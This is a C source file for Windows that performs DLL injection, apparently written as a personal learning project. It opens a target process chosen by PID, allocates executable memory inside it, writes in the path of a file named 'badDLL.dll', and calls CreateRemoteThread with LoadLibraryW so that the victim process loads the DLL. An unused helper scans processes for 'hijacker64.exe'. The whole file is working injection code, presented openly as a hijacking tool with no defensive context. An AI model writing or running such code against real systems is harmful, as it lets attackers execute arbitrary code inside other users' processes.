#include <stdio.h>
#include <Windows.h>
#include <psapi.h>


#define UNICODE
#define MODULESIZE 500

#pragma comment(lib,"User32.lib")

void EnumerateProcesses();

DWORD processIdentifiers[1024];
DWORD hijackpID;
HANDLE HijackHandle;
WCHAR* badDLL = L"C:\\Users\\Ronan\\Desktop\\web projects\\HardStuff\\EXEBLIGHT\\badDLL.dll";

int main (int argc, char *argv[]) {
    //We need to 
    /*
    Find Process
    Obtain process handle
    Allocate new memory region in process
    Write DLL path into memory
    Create remote thread with LoadLibrary as the start address, with DLL path as a parameter
            This looks tricky, lets try the LoadLibrary GetProcAddress trick in here first.
    */
    // EnumerateProcesses();
    // wprintf(L"Processes enumerated: %lu\n", processIdentifiers[1023]);
    printf("Selected PID: %d\n", atoi(argv[1]));
    HijackHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
    if (HijackHandle == 0 ){
        DWORD err = GetLastError();
        printf("Handle failed: %lu \n", err);
        return 1;
    }
    DWORD pathLength = wcslen(badDLL)+1;
    LPVOID CreateMemory = VirtualAllocEx(HijackHandle, NULL, pathLength * sizeof(WCHAR), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (CreateMemory == 0) {

        DWORD err = GetLastError();
        printf("Alloc failed: %lu \n", err);
        return 1;
    }
    DWORD nBytes;
    int WriteMemory = WriteProcessMemory(HijackHandle, CreateMemory, badDLL, (pathLength * sizeof(WCHAR)), &nBytes);
    if (WriteMemory == 0){
        DWORD err = GetLastError();
        printf("Write failed: %lu \n", err);
        return 1;
    }
    printf("%lu bytes written into process virtual memory...\n", nBytes);
    HMODULE hmKernel = GetModuleHandle("Kernel32.dll");
    if (hmKernel != 0){
        void* fp = GetProcAddress(hmKernel, "LoadLibraryW");
        if (fp != 0) {
            HANDLE hThread = CreateRemoteThread(HijackHandle, NULL, 0, fp, CreateMemory, 0, NULL);
            if (hThread == 0) {
                DWORD err = GetLastError();
                printf("CreateRemoteThread failed: %lu\n", err);
            }
            else {
                WaitForSingleObject(hThread, INFINITE);
                CloseHandle(hThread);
            }
        }
        else {
            DWORD err = GetLastError();
            printf("GetProcAaddress failed: %lu\n", err);
        }
    }
    else {
        DWORD err = GetLastError();
        printf("GetModuleHandle failed: %lu\n", err);
    }

}

void EnumerateProcesses () {

        DWORD sizeProcessIdentifiers = sizeof(processIdentifiers);
        DWORD bytesNeeded = 0;


        if (EnumProcesses(processIdentifiers, sizeProcessIdentifiers, &bytesNeeded) != 0) {

            processIdentifiers[1023] = bytesNeeded/sizeof(DWORD); //no. of processes

            for (int i = 0; i < bytesNeeded/sizeof(DWORD); i++){

                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processIdentifiers[i]);

                if (hProcess != NULL) { 
                    // wprintf(L"pID: %lu\n", processIdentifiers[i]);
                    HMODULE hm[MODULESIZE];
                    DWORD cb = sizeof(hm);
                    DWORD needed = 0;
                    WCHAR moduleName [50];

                    if (EnumProcessModulesEx(hProcess, hm, cb, &needed, LIST_MODULES_ALL) != 0){

                        DWORD nModules = needed/sizeof(HMODULE);

                        // wprintf(L"No. of modules: %lu\n", nModules);

                        for (int x = 0; x < nModules; x++) { //x <= 0 can be set to <nModules for all loaded DLLs.

                            if (GetModuleBaseNameW(hProcess, hm[x], moduleName, 50)) {

                                // wprintf(L"Module [%lu]: %ls\n", x, moduleName);
                                if (_wcsicmp(L"hijacker64.exe", moduleName) == 0) {
                                    hijackpID = processIdentifiers[i];
                                }

                            }
                            
                        }
                    }
                    else {

                        DWORD err = GetLastError();

                        wprintf(L"Error enumerating modules for pID %lu: %lu\n", processIdentifiers[i], err);
                    }
                }
                else {

                    DWORD err = GetLastError();

                    if (err != 5 && err != 87) {

                    wprintf(L"Could not open process handle for pID %lu: %lu\n", processIdentifiers[i], err);

                    }
                }
                CloseHandle(hProcess);
            }
            
        }
        else {
            WCHAR buf[50];
            DWORD err = GetLastError();
            swprintf_s(buf, 50, L"Error: %lu", err);
            MessageBoxW(NULL, buf, NULL, MB_OK);
        }
    }